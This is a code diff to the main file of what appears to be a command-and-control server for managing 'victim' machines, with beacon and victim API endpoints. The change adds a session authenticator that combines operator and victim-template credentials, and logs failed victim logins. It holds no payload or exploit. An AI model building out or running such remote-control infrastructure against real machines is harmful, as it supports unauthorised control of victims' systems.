@@ -18,6 +18,7 @@
 #include "VictimTemplateRepository.hpp"
 #include "OperatorAuthenticator.hpp"
 #include "VictimTemplateAuthenticator.hpp"
+#include "SessionConnectionAuthenticator.hpp"
 
 #include <Endpoints.hpp>
 #include <BeaconEndpoint.hpp>
@@ -27,6 +28,7 @@ bool is_locally_run = false;
 
 std::unique_ptr<IOperatorAuthenticator> g_operator_authenticator;
 std::unique_ptr<IVictimTemplateAuthenticator> g_victim_template_authenticator;
+std::unique_ptr<SessionConnectionAuthenticator> g_session_authenticator;
 
 // function protos
 void initial_setup();
@@ -36,6 +38,10 @@ void start_victim_api(int16_t port);
 int main(int argc, char* argv[]) {
     g_operator_authenticator = std::make_unique<OperatorAuthenticator>(db_file);
     g_victim_template_authenticator = std::make_unique<VictimTemplateAuthenticator>(db_file);
+    g_session_authenticator = std::make_unique<SessionConnectionAuthenticator>(
+        *g_operator_authenticator,
+        *g_victim_template_authenticator);
+    SessionManager::instance().set_session_authenticator(g_session_authenticator.get());
 
     // Load / Initialize Cofnig
     auto& config = Config::instance(db_file);
@@ -213,6 +219,7 @@ bool victim_auth_middleware(const HttpRequest& request, HttpResponse& response) 
     if (!g_victim_template_authenticator->authenticate(username, password)) {
         response.set_status(401);
         response.set_json(R"({"message":"Unauthorized: Invalid username or password"})");
+        std::println("Unauthorized: Invalid credentials for victim template [{}]", username);
         return false;
     }
 
